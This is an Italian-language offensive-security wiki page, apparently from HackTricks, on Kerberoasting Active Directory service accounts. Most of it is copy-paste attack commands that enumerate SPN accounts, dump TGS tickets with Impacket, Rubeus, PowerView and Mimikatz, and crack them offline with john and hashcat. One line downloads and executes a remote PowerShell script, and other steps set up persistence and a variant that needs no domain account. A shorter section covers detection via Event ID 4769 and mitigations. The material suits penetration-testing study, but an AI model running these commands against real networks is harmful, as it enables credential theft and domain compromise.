# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting si concentra sull'acquisizione di **TGS tickets**, specificamente quelli relativi ai servizi che operano sotto **account utente** in **Active Directory (AD)**, escludendo **account computer**. La crittografia di questi ticket utilizza chiavi che originano da **password utente**, consentendo la possibilità di **offline credential cracking**. L'uso di un account utente come servizio è indicato da una proprietà **"ServicePrincipalName"** non vuota.

Per eseguire **Kerberoasting**, è essenziale un account di dominio in grado di richiedere **TGS tickets**; tuttavia, questo processo non richiede **privilegi speciali**, rendendolo accessibile a chiunque abbia **credenziali di dominio valide**.

### Punti Chiave:

- **Kerberoasting** mira ai **TGS tickets** per **servizi di account utente** all'interno di **AD**.
- I ticket crittografati con chiavi da **password utente** possono essere **crackati offline**.
- Un servizio è identificato da un **ServicePrincipalName** che non è nullo.
- **Nessun privilegio speciale** è necessario, solo **credenziali di dominio valide**.

### **Attacco**

> [!WARNING]
> Gli **strumenti di Kerberoasting** richiedono tipicamente **`RC4 encryption`** quando eseguono l'attacco e iniziano le richieste TGS-REQ. Questo perché **RC4 è** [**più debole**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) e più facile da crackare offline utilizzando strumenti come Hashcat rispetto ad altri algoritmi di crittografia come AES-128 e AES-256.\
> Gli hash RC4 (tipo 23) iniziano con **`$krb5tgs$23$*`** mentre gli AES-256 (tipo 18) iniziano con **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Strumenti multi-funzionali che includono un dump di utenti kerberoastable:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Enumerare gli utenti Kerberoastable**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Tecnica 1: Richiedi TGS e dumpalo dalla memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Tecnica 2: Strumenti automatici**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Quando viene richiesta una TGS, viene generato l'evento di Windows `4769 - È stato richiesto un ticket di servizio Kerberos`.

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistenza

Se hai **sufficienti permessi** su un utente, puoi **renderlo kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puoi trovare utili **tools** per attacchi di **kerberoast** qui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se trovi questo **error** da Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** è a causa del tuo orario locale, devi sincronizzare l'host con il DC. Ci sono alcune opzioni:

- `ntpdate <IP del DC>` - Deprecato a partire da Ubuntu 16.04
- `rdate -n <IP del DC>`

### Mitigazione

Il kerberoasting può essere condotto con un alto grado di furtività se è sfruttabile. Per rilevare questa attività, è necessario prestare attenzione a **Security Event ID 4769**, che indica che un biglietto Kerberos è stato richiesto. Tuttavia, a causa dell'alta frequenza di questo evento, devono essere applicati filtri specifici per isolare attività sospette:

- Il nome del servizio non dovrebbe essere **krbtgt**, poiché si tratta di una richiesta normale.
- I nomi dei servizi che terminano con **$** dovrebbero essere esclusi per evitare di includere account macchina utilizzati per i servizi.
- Le richieste provenienti da macchine dovrebbero essere filtrate escludendo i nomi degli account formattati come **machine@domain**.
- Solo le richieste di biglietti riuscite dovrebbero essere considerate, identificate da un codice di errore di **'0x0'**.
- **Soprattutto**, il tipo di crittografia del biglietto dovrebbe essere **0x17**, che è spesso utilizzato negli attacchi di Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Per mitigare il rischio di Kerberoasting:

- Assicurati che **le password degli account di servizio siano difficili da indovinare**, raccomandando una lunghezza di oltre **25 caratteri**.
- Utilizza **Managed Service Accounts**, che offrono vantaggi come **cambi automatici delle password** e **gestione delegata del Service Principal Name (SPN)**, migliorando la sicurezza contro tali attacchi.

Implementando queste misure, le organizzazioni possono ridurre significativamente il rischio associato al Kerberoasting.

## Kerberoast senza account di dominio

Nel **settembre 2022**, un nuovo modo di sfruttare un sistema è stato portato alla luce da un ricercatore di nome Charlie Clark, condiviso attraverso la sua piattaforma [exploit.ph](https://exploit.ph/). Questo metodo consente l'acquisizione di **Service Tickets (ST)** tramite una richiesta **KRB_AS_REQ**, che notevolmente non richiede il controllo su alcun account di Active Directory. Fondamentalmente, se un principale è configurato in modo tale da non richiedere la pre-autenticazione—uno scenario simile a quello noto nel campo della cybersecurity come un **attacco AS-REP Roasting**—questa caratteristica può essere sfruttata per manipolare il processo di richiesta. Specificamente, alterando l'attributo **sname** all'interno del corpo della richiesta, il sistema viene ingannato a emettere un **ST** piuttosto che il consueto Ticket Granting Ticket (TGT) crittografato.

La tecnica è spiegata completamente in questo articolo: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Devi fornire un elenco di utenti perché non abbiamo un account valido per interrogare l'LDAP utilizzando questa tecnica.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus da PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Riferimenti

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
